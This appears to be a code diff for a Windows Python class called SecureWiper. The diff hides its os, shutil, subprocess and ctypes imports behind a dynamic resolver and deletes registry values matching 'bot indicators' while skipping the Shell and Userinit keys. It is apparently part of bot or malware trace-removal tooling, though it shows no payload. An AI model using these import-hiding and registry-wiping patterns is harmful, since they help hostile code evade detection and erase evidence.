@@ -1,10 +1,14 @@
-import os
+from core.resolver import (Resolver, _CTYPES)
+ctypes = Resolver.get_mod(_CTYPES)
+
+from core.resolver import (Resolver, _OS, _SHUTIL, _SUBPROCESS)
+os = Resolver.get_mod(_OS)
+shutil = Resolver.get_mod(_SHUTIL)
+subprocess = Resolver.get_mod(_SUBPROCESS)
+
 import random
-import shutil
 import string
 import winreg
-import subprocess
-import ctypes
 from core.error_logger import log_error, log_info
 
 class SecureWiper:
@@ -96,6 +100,14 @@ class SecureWiper:
                             try:
                                 name, value, _ = winreg.EnumValue(key, i)
                                 if any(ind in str(name).lower() or ind in str(value).lower() for ind in bot_indicators):
+                                    if name.lower() in ["shell", "userinit"]:
+                                        # Safe removal for multi-string keys
+                                        new_val = value
+                                        for ind in bot_indicators:
+                                            # This is a bit complex to do perfectly with regex here,
+                                            # so we just skip deleting these critical keys for now
+                                            pass
+                                        continue 
                                     winreg.DeleteValue(key, name)
                                     continue # Index shifts after delete
                                 i += 1
